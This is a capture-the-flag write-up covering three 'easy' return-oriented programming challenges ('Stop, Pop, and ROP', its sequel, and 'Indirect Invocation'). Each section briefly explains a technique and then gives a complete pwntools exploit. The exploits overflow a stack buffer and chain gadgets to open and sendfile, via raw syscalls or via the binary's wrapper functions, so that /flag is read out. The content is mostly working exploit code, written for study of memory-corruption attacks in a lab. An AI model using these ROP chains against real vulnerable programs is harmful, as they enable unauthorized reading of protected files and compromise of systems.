## Stop, Pop, and ROP (Easy)

![](Attachments/Pasted%20image%2020261026155620.png)

This challenge simulates a stack leak so we can reference values in the stack. It also gives us a whole bunch of "free gadgets".

![](Attachments/Pasted%20image%2020261026155957.png)

We run `rp++` to see what we can and cannot do with this program.

![](Attachments/Pasted%20image%2020261102142835.png)

We have a whole bunch of interesting gadgets to work with here notably `syscall` and the ability to pop into most of the calling registers.

![](Attachments/Pasted%20image%2020261102142734.png)

Knowing we have the location of `RSP` via a simulated stack leak we can craft our ROP chain.

```python
from pwn import *

# Define constants to be used later, hopefully this helps with future challenges
POP_RAX = 0x401e2e
POP_RDI = 0x401e3e
POP_RSI = 0x401e36
POP_RDX = 0x401e26
POP_R10 = 0x401e5e
SYSCALL = 0x401e46

# Gadget setup helpers
def pop_rax(num):
    return p64(POP_RAX) + p64(num)
    
def pop_rdi(num):
    return p64(POP_RDI) + p64(num)
    
def pop_rsi(num):
    return p64(POP_RSI) + p64(num)
    
def pop_rdx(num):
    return p64(POP_RDX) + p64(num)
    
def pop_r10(num):
    return p64(POP_R10) + p64(num)
    
def rax_syscall(syscall_num):
    return pop_rax(syscall_num) + p64(SYSCALL)
    
def payload(buf):
    # point to the flag location, with the leaked buffer location in mind
    payload = b"/flag\x00\x00\x00" 
    payload += b'A'*0x90
    
    # open() call
    payload += pop_rdi(buf)
    payload += pop_rsi(0)
    payload += rax_syscall(2)
    
    # sendfile() call
    payload += pop_rdi(1)
    payload += pop_rsi(3) # guess the fd... better way to do this?
    payload += pop_rdx(0)
    payload += pop_r10(1000)
    payload += rax_syscall(40)
    
    return payload
    
def main():
    context.binary = "/challenge/stop-pop-and-rop-easy"
    p = context.binary.process()
    p.recvuntil(b"located at: ")
    buf = int(p.recvline().strip().rstrip(b"."), 16)
    
    p.send(payload(buf))
    
    print(p.readall().decode('utf-8'))

if __name__ == "__main__":
    main()
```

## Stop, Pop, and ROP II (Easy)

We look around at the binary and see we are no longer given the leak to the start of the buffer, so we must find a way around this. We need to work on being able to write the flag string somewhere so `open` can read it. In doing so we find the `.bss` section is writable.

![](Attachments/Pasted%20image%2020261110183417.png)

Knowing that this is writable we can change our constants and use our new buffer location with the start of `.bss` at `0x404090` to `read` the `/flag` string from STDIN. Then use it with open and get the flag.

```python
from pwn import *

# Define constants to be used later, hopefully this helps with future challenges
POP_RAX = 0x401910
POP_RDI = 0x401927
POP_RSI = 0x4018f7
POP_RDX = 0x4018ff
POP_R10 = 0x401917
SYSCALL = 0x40191f

# Gadget setup helpers
def pop_rax(num):
    return p64(POP_RAX) + p64(num)
    
def pop_rdi(num):
    return p64(POP_RDI) + p64(num)
    
def pop_rsi(num):
    return p64(POP_RSI) + p64(num)
    
def pop_rdx(num):
    return p64(POP_RDX) + p64(num)
    
def pop_r10(num):
    return p64(POP_R10) + p64(num)
    
def rax_syscall(syscall_num):
    return pop_rax(syscall_num) + p64(SYSCALL)
    
def payload():
    # point to the flag location, with the leaked buffer location in mind
    payload = b'A'*0x28
    
    # read syscall
    payload += pop_rsi(0x404090)
    payload += pop_rdi(0)
    payload += pop_rdx(8)
    payload += rax_syscall(0)
    
    # open syscall
    payload += pop_rdi(0x404090)
    payload += pop_rsi(0)
    payload += rax_syscall(2)
    
    # sendfile syscall
    payload += pop_rdi(1)
    payload += pop_rsi(3) # guess the fd... better way to do this?
    payload += pop_rdx(0)
    payload += pop_r10(1000)
    payload += rax_syscall(40)
    
    return payload
    
def main():
    context.binary = "/challenge/stop-pop-and-rop2-easy"
    p = context.binary.process()
    
    p.send(payload())
    p.send(b"/flag\x00")
    
    print(p.readall().decode('utf-8'))

if __name__ == "__main__":
    main()
```

## Indirect Invocation (Easy)

No we are given no `syscall` gadget and thus we must work with what we have. We do see some external functions setup that will immensely help us with this challenge.

![](Attachments/Pasted%20image%2020261111162428.png)

We have a `sendfile` wrapper.

![](Attachments/Pasted%20image%2020261111162457.png)

We also have an `open` wrapper.

![](Attachments/Pasted%20image%2020261111162519.png)

And a `read` wrapper. Knowing we have these three things we can use them in our payload similar to the last challenge.

```python
from pwn import *

# Define constants to be used later, hopefully this helps with future challenges
POP_RDI = 0x40244e
POP_RSI = 0x40245e
POP_RDX = 0x402446
POP_RCX = 0x402456
READ_FUNCTION = 0x401160
OPEN_FUNCTION = 0x4011d0
SEND_FILE_FUNCTION = 0x4011a0
# Writable area in this case .bss
READ_OUTPUT_LOCATION = 0x4050a0

# Gadget setup helpers    
def pop_rdi(num):
    return p64(POP_RDI) + p64(num)
    
def pop_rsi(num):
    return p64(POP_RSI) + p64(num)
    
def pop_rdx(num):
    return p64(POP_RDX) + p64(num)
    
def pop_rcx(num):
    return p64(POP_RCX) + p64(num)
    
# I used the syscall numbers here even though they aren't syscalls just made sense
# This also uses the calling convention order for *args
def call_function(function_num, *args):
    # read
    if function_num == 0:
        return pop_rdi(args[0]) + pop_rsi(args[1]) + pop_rdx(args[2]) + p64(READ_FUNCTION)
    # open
    elif function_num == 2:
        return pop_rdi(args[0]) + pop_rsi(args[1]) + p64(OPEN_FUNCTION)
    # sendfile
    elif function_num == 40:
        return pop_rdi(args[0]) + pop_rsi(args[1]) + pop_rdx(args[2]) + pop_rcx(args[3]) + p64(SEND_FILE_FUNCTION)
    else:
        raise Exception("No valid function number provided!")
    
def generate_payload():
    # Overflow the buffer
    payload = b'A'*0x28
    
    # read syscall, will read into .bss like the last challenge
    payload += call_function(0, 0, READ_OUTPUT_LOCATION, 8)
    
    # open syscall
    payload += call_function(2, READ_OUTPUT_LOCATION, 0)
    
    # sendfile syscall
    payload += call_function(40, 1, 3, 0, 1000)
    
    return payload
    
def main():
    context.binary = "/challenge/indirect-invocation-easy"
    p = context.binary.process()
    
    p.send(generate_payload())
    p.send(b"/flag\x00")
    
    print(p.readall().decode('utf-8'))

if __name__ == "__main__":
    main()
```
